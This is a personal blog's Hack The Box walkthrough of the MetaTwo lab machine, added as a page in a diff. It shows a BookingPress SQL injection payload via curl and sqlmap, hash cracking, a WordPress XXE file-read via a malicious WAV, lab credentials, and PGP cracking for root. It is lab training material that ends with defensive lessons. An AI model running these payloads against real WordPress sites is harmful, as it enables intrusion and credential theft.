@@ -1,0 +1,118 @@
+<!DOCTYPE html><html lang="en" data-theme> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>MetaTwo — Hack The Box Walkthrough · Feizal Said</title><meta name="description" content="Full attack chain on MetaTwo: WordPress SQLi, XXE exploitation, and passpie privilege escalation."><!-- Theme: apply before paint to avoid FOUC --><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          var dark = t
+            ? t === 'dark'
+            : window.matchMedia('(prefers-color-scheme: dark)').matches;
+          document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+        } catch (e) {
+          document.documentElement.setAttribute(
+            'data-theme',
+            window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
+          );
+        }
+      })();
+    </script><!-- Social / OG --><meta property="og:type" content="website"><meta property="og:title" content="MetaTwo — Hack The Box Walkthrough · Feizal Said"><meta property="og:description" content="Full attack chain on MetaTwo: WordPress SQLi, XXE exploitation, and passpie privilege escalation."><meta property="og:url" content="https://feizalsaid.github.io/writeups/htb-metatwo-01/"><meta property="og:image" content="https://feizalsaid.github.io/images/og-cover.png"><meta property="og:site_name" content="Feizal Said"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="MetaTwo — Hack The Box Walkthrough · Feizal Said"><meta name="twitter:description" content="Full attack chain on MetaTwo: WordPress SQLi, XXE exploitation, and passpie privilege escalation."><meta name="twitter:image" content="https://feizalsaid.github.io/images/og-cover.png"><link rel="canonical" href="https://feizalsaid.github.io/writeups/htb-metatwo-01/"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><!-- Fonts --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"><!-- Structured data --><script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "Person",
+        "name": "Feizal Said",
+        "url": {new URL('/', SITE).href},
+        "jobTitle": "Cybersecurity & Cloud Security Engineer",
+        "email": "mailto:feizalsaid9@gmail.com",
+        "sameAs": [
+          "https://github.com/feizalsaid",
+          "https://www.linkedin.com/in/feizalsaid",
+          "https://app.hackthebox.com/users/feizalsaid",
+          "https://tryhackme.com/p/feizalsaid"
+        ]
+      }
+    </script><link rel="stylesheet" href="/_astro/certifications.BBSei92j.css">
+<style>.writeup-article{max-width:48rem;margin:0 auto;padding:2rem 1.25rem 4rem}.back-link{color:var(--accent-text);font-size:.85rem;text-decoration:none}.back-link:hover{text-decoration:underline}.article-head{margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border)}.meta-row{display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;margin-bottom:1rem}.meta{color:var(--text-muted);font-size:.8rem}.article-title{font-size:clamp(1.7rem,4vw,2.4rem);margin:0 0 .75rem}.article-desc{color:var(--text-secondary);font-size:1.02rem;line-height:1.6;margin:0 0 1rem}.tag-row{list-style:none;display:flex;flex-wrap:wrap;gap:.5rem;padding:0;margin:0}.article-footer{margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style></head> <body> <!-- Background layers --> <div class="grid-bg" aria-hidden="true"></div> <div class="glow-orb glow-orb-1" aria-hidden="true"></div> <div class="glow-orb glow-orb-2" aria-hidden="true"></div> <div class="relative z-10 flex min-h-screen flex-col"> <header class="site-header"> <div class="header-inner"> <a class="logo" href="/" aria-label="Feizal Said — home"> <span class="prompt" aria-hidden="true">$</span> <span class="logo-name">feizal<span class="path">@sec</span> ~</span> </a> <nav aria-label="Primary"> <ul class="nav-list"> <li> <a class="nav-link" href="/"> Home </a> </li><li> <a class="nav-link" href="/certifications/"> Certifications </a> </li><li> <a class="nav-link" href="/skills/"> Skills </a> </li><li> <a class="nav-link" href="/projects/"> Projects </a> </li><li> <a class="nav-link active" href="/writeups/" aria-current="page"> Writeups </a> </li> </ul> </nav> <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle color theme" data-theme-icon> <svg class="icon-moon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> <svg class="icon-sun" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <script type="module">const c=document.getElementById("themeToggle");c&&c.addEventListener("click",()=>{const t=document.documentElement,e=t.getAttribute("data-theme")==="dark"?"light":"dark";t.setAttribute("data-theme",e);try{localStorage.setItem("theme",e)}catch{}});</script>  </div> </header>  <main class="relative flex-1">  <article class="writeup-article"> <a class="back-link font-mono" href="/writeups/">← all writeups</a> <header class="article-head"> <div class="meta-row"> <span class="cat-badge offensive">Offensive</span> <span class="meta font-mono"><time datetime="2026-09-01T00:00:00.000Z">September 1, 2026</time></span> <span class="meta font-mono">10 min read</span> </div> <h1 class="article-title font-display">MetaTwo — Hack The Box Walkthrough</h1> <p class="article-desc">Full attack chain on MetaTwo: WordPress SQLi, XXE exploitation, and passpie privilege escalation.</p> <ul class="tag-row"> <li class="tag">Hack The Box</li><li class="tag">WordPress</li><li class="tag">SQL Injection</li><li class="tag">XXE</li><li class="tag">CVE-2022-0739</li><li class="tag">CVE-2021-29447</li><li class="tag">passpie</li><li class="tag">PGP</li><li class="tag">Linux</li><li class="tag">CTF</li> <li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1190</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1068</li> </ul> </header> <div class="writeup-body"><p><strong>Machine:</strong> MetaTwo
+<strong>Difficulty:</strong> Easy
+<strong>Key Techniques:</strong> BookingPress SQLi (CVE-2022-0739), WordPress XXE (CVE-2021-29447), FTP credential leak, passpie/PGP privesc</p>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -sV</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> 21,22,80</span><span style="color:#79B8FF"> 10.129.228.95</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>21</td><td>ftp</td><td>filtered</td></tr><tr><td>22</td><td>ssh</td><td>OpenSSH 8.4p1 Debian</td></tr><tr><td>80</td><td>http</td><td>nginx 1.18.0</td></tr></tbody></table>
+<p>Port 80 redirects to <strong><a href="http://metapress.htb/">http://metapress.htb/</a></strong>. Add it to <code>/etc/hosts</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "10.129.228.95 metapress.htb"</span><span style="color:#F97583"> >></span><span style="color:#9ECBFF"> /etc/hosts</span></span></code></pre>
+<p>The site is <strong>WordPress 5.6.2</strong> powered by the <strong>BookingPress</strong> appointment-booking plugin.</p>
+<hr>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="bookingpress-sql-injection-cve-2022-0739">BookingPress SQL Injection (CVE-2022-0739)</h3>
+<p>The BookingPress plugin (pre-1.0.11) is vulnerable to unauthenticated SQL injection via the AJAX endpoint.</p>
+<p>Capture a valid <code>_wpnonce</code> from the site, then inject:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> 'http://metapress.htb/wp-admin/admin-ajax.php'</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  --data</span><span style="color:#9ECBFF"> 'action=bookingpress_front_get_category_services&#x26;_wpnonce=&#x3C;nonce>&#x26;category_id=33&#x26;total_service=-75 UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6,7,8,9-- -'</span></span></code></pre>
+<p>Automate with <code>sqlmap</code> to dump <code>wp_users</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> "http://metapress.htb/wp-admin/admin-ajax.php"</span><span style="color:#79B8FF"> --data=</span><span style="color:#9ECBFF">"action=bookingpress_front_get_category_services&#x26;_wpnonce=&#x3C;nonce>&#x26;category_id=33"</span><span style="color:#79B8FF"> --dump</span><span style="color:#79B8FF"> -T</span><span style="color:#9ECBFF"> wp_users</span><span style="color:#79B8FF"> -D</span><span style="color:#9ECBFF"> wordpress</span></span></code></pre>
+<p>Two password hashes found. Crack the <code>manager</code> user’s hash:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hashcat</span><span style="color:#9ECBFF"> hash.txt</span><span style="color:#9ECBFF"> /usr/share/wordlists/rockyou.txt</span><span style="color:#79B8FF"> -m</span><span style="color:#79B8FF"> 400</span></span></code></pre>
+<p>Login to <code>wp-admin</code> as <code>manager</code>.</p>
+<h3 id="wordpress-xxe-cve-2021-29447">WordPress XXE (CVE-2021-29447)</h3>
+<p>WordPress 5.6.2 is vulnerable to out-of-band XXE via the media upload endpoint. Craft a malicious WAV file with an embedded DTD payload pointing to your attacker server.</p>
+<p>Upload the WAV file and read files from the server via the XXE callback:</p>
+<ul>
+<li>Read <code>/etc/passwd</code> → reveals user <code>jnelson</code></li>
+<li>Read FTP config files → reveals credentials: <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code></li>
+</ul>
+<h3 id="foothold">Foothold</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ftp</span><span style="color:#9ECBFF"> metapress.htb</span></span>
+<span class="line"><span style="color:#6A737D"># Login: metapress.htb / 9NYS_ii@FyL_p5M2NvJ</span></span></code></pre>
+<p>Download a PHP file from FTP containing <strong>plaintext SSH credentials</strong> for <code>jnelson</code>.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ssh</span><span style="color:#9ECBFF"> jnelson@10.129.228.95</span></span></code></pre>
+<p>User flag:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>user.txt: &#x3C;flag></span></span></code></pre>
+<hr>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="passpie--pgp-decryption">Passpie + PGP Decryption</h3>
+<p>In <code>jnelson</code>’s home directory, a hidden <code>.passpie</code> directory contains PGP keys and an encrypted <code>root.pass</code> file holding the root password.</p>
+<p>Extract a crackable hash from the private key:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gpg2john</span><span style="color:#9ECBFF"> private.key</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> hash.txt</span></span>
+<span class="line"><span style="color:#B392F0">john</span><span style="color:#79B8FF"> --wordlist=/usr/share/wordlists/rockyou.txt</span><span style="color:#9ECBFF"> hash.txt</span></span></code></pre>
+<p><strong>Passphrase:</strong> <code>blink182</code></p>
+<p>Decrypt the root password:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gpg</span><span style="color:#79B8FF"> --import</span><span style="color:#9ECBFF"> private.key</span></span>
+<span class="line"><span style="color:#B392F0">gpg</span><span style="color:#79B8FF"> --decrypt</span><span style="color:#9ECBFF"> root.pass</span></span>
+<span class="line"><span style="color:#6A737D"># root password revealed</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">su</span><span style="color:#9ECBFF"> root</span></span>
+<span class="line"><span style="color:#6A737D"># Enter the decrypted password</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>root.txt: &#x3C;flag></span></span></code></pre>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ol>
+<li><strong>Patch outdated software.</strong> The BookingPress SQLi, WordPress XXE, and outdated components are all fixed by updates.</li>
+<li><strong>Remove default/weak plugin configurations.</strong> Monitor installed plugins and versions.</li>
+<li><strong>Never store plaintext SSH credentials</strong> in files accessible over FTP. Use SSH keys and a secrets manager.</li>
+<li><strong>Use strong passphrases for PGP keys</strong> protecting root credentials — <code>blink182</code> was trivially crackable.</li>
+</ol></div> <nav class="article-footer" aria-label="Writeup navigation"> <a class="back-link font-mono" href="/writeups/">← back to writeups</a> </nav> </article>  </main> <footer class="site-footer"> <div class="footer-inner"> <p class="footer-line"> <span class="prompt" aria-hidden="true">$</span> whoami
+<span class="dim">→ Feizal Said · Nairobi, Kenya</span> </p> <ul class="footer-links" aria-label="Social links"> <li><a href="https://github.com/feizalsaid" target="_blank" rel="noopener noreferrer">GitHub</a></li><li><a href="https://www.linkedin.com/in/feizalsaid" target="_blank" rel="noopener noreferrer">LinkedIn</a></li><li><a href="https://app.hackthebox.com/users/feizalsaid" target="_blank" rel="noopener noreferrer">Hack The Box</a></li><li><a href="https://tryhackme.com/p/feizalsaid" target="_blank" rel="noopener noreferrer">TryHackMe</a></li><li><a href="mailto:feizalsaid9@gmail.com" target="_blank" rel="noopener noreferrer">Email</a></li> </ul> <p class="copy">&copy; 2026 Feizal Said. Built with Astro.</p> </div> </footer>  </div> </body></html> 
